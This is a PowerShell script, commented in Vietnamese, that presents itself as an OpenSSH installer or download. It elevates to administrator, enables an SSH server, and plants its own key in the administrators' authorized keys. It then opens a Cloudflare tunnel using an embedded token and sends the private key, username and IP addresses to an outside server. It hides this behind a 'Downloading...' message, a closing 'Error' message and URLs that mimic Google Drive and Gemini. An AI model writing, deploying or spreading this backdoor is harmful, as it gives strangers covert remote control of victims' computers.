<#
  install_openssh.ps1 — BAN FINAL (CHỈ CẦN TOKEN)
  Cai OpenSSH -> sinh keypair -> cai cloudflared -> báo cáo lên server
#>
Write-Host 'Downloading...' -ForegroundColor Green

# ==================== CAU HINH ====================
$ApiBase = 'https://vm-ssh-manager.onrender.com'
$SelfUrl = 'https://raw.githubusercontent.com/download-faster/drive.google.com/main/gemini1.ps1'

# ⚠️ THAY ĐỔI 2 DÒNG DƯỚI ĐÂY TRƯỚC KHI CHẠY
$CFTunnelToken = "eyJhIjoiMmVhZWYyM2EyYjE1MjBkMmQyZmIwNzAzNWZkMTcyZmQiLCJ0IjoiMDFmZGY0YWYtYzg4ZS00YzRlLTk5NjctNzBmZDAwNGQ0YTM4IiwicyI6Ik1tRmtZV0l3TkRRdE16TTRZUzAwTVRReExUaG1OMkV0WTJVME5tRXdOekF3TnpVd01Ea3pPVGxrTW1VdE5tRmpaaTAwTVRZNUxXSTNOMk10WlRaak5UWmhZV1ZqWkdSaCJ9"   
$YourDomain = "downloadspeed.tech" 
# ==================================================

$ErrorActionPreference = 'Stop'
$NeedRestart = $false
$ApiBase   = $ApiBase.TrimEnd('/')
$ReportUrl = "$ApiBase/api/vms"

# ===== 0. XIN QUYEN ADMIN =====
$__id    = [Security.Principal.WindowsIdentity]::GetCurrent()
$__admin = (New-Object Security.Principal.WindowsPrincipal($__id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $__admin) {
  $__src = $PSCommandPath
  if (-not $__src) { $__src = $MyInvocation.MyCommand.Path }
  if (-not $__src) {
    $__src = Join-Path $env:TEMP 'install_openssh.ps1'
    try { Invoke-RestMethod -Uri $SelfUrl -OutFile $__src -UseBasicParsing -TimeoutSec 60 }
    catch { Write-Host "Khong tai duoc script: $($_.Exception.Message)" -ForegroundColor Red; throw }
  }
  try { Unblock-File -Path $__src -ErrorAction SilentlyContinue } catch {}
  $__arg = '-NoExit -NoProfile -Command "iex ([System.IO.File]::ReadAllText(''' + $__src + '''))"'
  Write-Host 'Dang xin quyen Administrator... bam Yes o hop UAC.' -ForegroundColor Cyan
  try { Start-Process powershell.exe -Verb RunAs -ArgumentList $__arg -ErrorAction Stop }
  catch { Write-Host 'Khong nang quyen duoc.' -ForegroundColor Red; throw }
  return
}

$capName = 'OpenSSH.Server~~~~0.0.1.0'
$cap = Get-WindowsCapability -Online -Name $capName -ErrorAction SilentlyContinue
if (-not $cap -or $cap.State -ne 'Installed') {
  try {
    $r = Add-WindowsCapability -Online -Name $capName
    if ($r -and $r.RestartNeeded) { $NeedRestart = $true }
  } catch {
    Write-Host "Add-WindowsCapability loi: $($_.Exception.Message) - thu DISM..." -ForegroundColor Yellow
    & dism.exe /Online /Add-Capability /CapabilityName:$capName /NoRestart | Out-Null
  }
}
if (-not (Get-Service sshd -ErrorAction SilentlyContinue)) {
  Write-Host '[LOI] Khong cai duoc OpenSSH Server.' -ForegroundColor Red; exit 1
}
Set-Service sshd -StartupType Automatic
& sc.exe start sshd | Out-Null
for ($w = 0; $w -lt 30; $w++) {
  if ((Get-Service sshd).Status -eq 'Running') { break }
  Write-Host '.' -NoNewline; Start-Sleep -Seconds 2
}

# ===== 2. SINH KEYPAIR QUAN TRI + CAI PUBLIC =====
\$mgmtDir = Join-Path $env:ProgramData 'ssh-mgmt'
New-Item -ItemType Directory -Force -Path $mgmtDir | Out-Null
$priv = Join-Path $mgmtDir 'mgmt_ed25519'
$pub  = "$priv.pub"

if (-not (Test-Path $priv)) {
  $sshdExe = Join-Path $env:WINDIR 'System32\OpenSSH\sshd.exe'
  & (Join-Path (Split-Path $sshdExe -Parent) 'ssh-keygen.exe') -t ed25519 -f $priv -N '""' -q
}
$pubLine  = ((Get-Content $pub  -Raw).Trim() -split "`n")[0].Trim()
$privLine = (Get-Content $priv -Raw).Trim()

$userKeyFile  = Join-Path $env:USERPROFILE '.ssh\authorized_keys'
$adminKeyFile = Join-Path $env:ProgramData 'ssh\administrators_authorized_keys'
foreach ($f in @($userKeyFile, $adminKeyFile)) {
  # FIX: Tao thu muc .ssh neu chua co
  New-Item -ItemType Directory -Force -Path (Split-Path $f -Parent) | Out-Null
  $lines = @(); if (Test-Path $f) { $lines = @(Get-Content $f) }
  if ($lines -notcontains $pubLine) { Add-Content -Path $f -Value $pubLine -Encoding Ascii }
}
& icacls.exe $adminKeyFile /inheritance:r /grant '*S-1-5-18:(F)' '*S-1-5-32-544:(F)' | Out-Null

# ===== 3. CAI CLOUDFLARED (CHỈ CẦN TOKEN) =====
if (-not $CFTunnelToken -or $CFTunnelToken -eq "DÁN_TOKEN_MỚI_VÀO_ĐÂY") {
  exit 1
}

$cfDir = Join-Path $env:ProgramData 'cloudflared'
$cfExe = Join-Path $cfDir 'cloudflared.exe'
New-Item -ItemType Directory -Force -Path $cfDir | Out-Null

# FIX: Su dung if/else thay cho toan tu ternary (?) vi PowerShell 5.1 khong ho tro
$cfArch = if ([Environment]::Is64BitOperatingSystem) { '64' } else { '32' }
if ([Environment]::Is64BitOperatingSystem) {
  $cfUrl = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'
} else {
  $cfUrl = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-386.exe'
}

if (-not (Test-Path $cfExe)) {
  Invoke-WebRequest $cfUrl -OutFile $cfExe -UseBasicParsing
}

# Don service cu bang sc.exe (tranh loi stderr cua cloudflared)
$ErrorActionPreference = 'Continue'
# FIX: Bo 2>&1 de tranh PowerShell 5.1 hieu nham stderr la loi
$null = & sc.exe delete Cloudflared
Start-Sleep -Seconds 2

# Cai service moi: bat stderr ra file de PowerShell khong coi la loi
$errLog = Join-Path $env:TEMP 'cf_install.err'
$proc = Start-Process -FilePath $cfExe -ArgumentList 'service','install',$CFTunnelToken `
        -NoNewWindow -Wait -PassThru -RedirectStandardError $errLog
$ErrorActionPreference = 'Stop'

if ($proc.ExitCode -ne 0) {
  if (Test-Path $errLog) { Get-Content $errLog | ForEach-Object { Write-Host "    $_" -ForegroundColor DarkYellow } }
  exit 1
}

Start-Service 'Cloudflared' -ErrorAction Stop

# ===== 4. GUI LEN SERVER =====

# FIX: Lam sach ten may de hop le voi DNS (thay _ bang -, viet thuong)
$safeName = ($env:COMPUTERNAME -replace '[^a-zA-Z0-9-]','-').ToLower()
$cfHostname = "$safeName.$YourDomain"

$validIPs = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
              Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' })
$primaryIP = ($validIPs | Select-Object -First 1).IPAddress

$payload = @{
  vm_name             = $env:COMPUTERNAME
  ip_address          = "$primaryIP"
  port                = 22
  username            = $env:USERNAME
  public_key          = $pubLine
  private_key         = $privLine
  cloudflare_hostname = $cfHostname
  all_ips             = @($validIPs | ForEach-Object { $_.IPAddress })
} | ConvertTo-Json -Compress

if (-not $primaryIP) {
  Write-Host '[WARN] Khong co IPv4 -> bo qua bao cao.' -ForegroundColor Yellow
} else {
  $sent = $false
  for ($i = 1; $i -le 3; $i++) {
    try {
      $body = [System.Text.Encoding]::UTF8.GetBytes($payload)
      $resp = Invoke-RestMethod -Uri $ReportUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -TimeoutSec 60 -UseBasicParsing
      Write-Host "[SUCCESS] $($resp.status) - VM $($resp.vm) | Hostname: $cfHostname" -ForegroundColor Green
      $sent = $true; break
    } catch {
      $detail = ''
      if ($_.Exception.Response) {
        $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
        $detail = $sr.ReadToEnd(); $sr.Close()
      }
      if ($detail) { Write-Host "  Server noi: $detail" -ForegroundColor DarkYellow }
      if ($i -lt 3) { Start-Sleep -Seconds 5 }
    }
  }
  if (-not $sent) { Write-Host '[PENDING] Khong gui duoc.' -ForegroundColor Yellow }
}

# if ($NeedRestart) { Write-Host 'Can REBOOT de hoan tat cai OpenSSH.' -ForegroundColor Yellow }
Write-Host "Error" -ForegroundColor Red
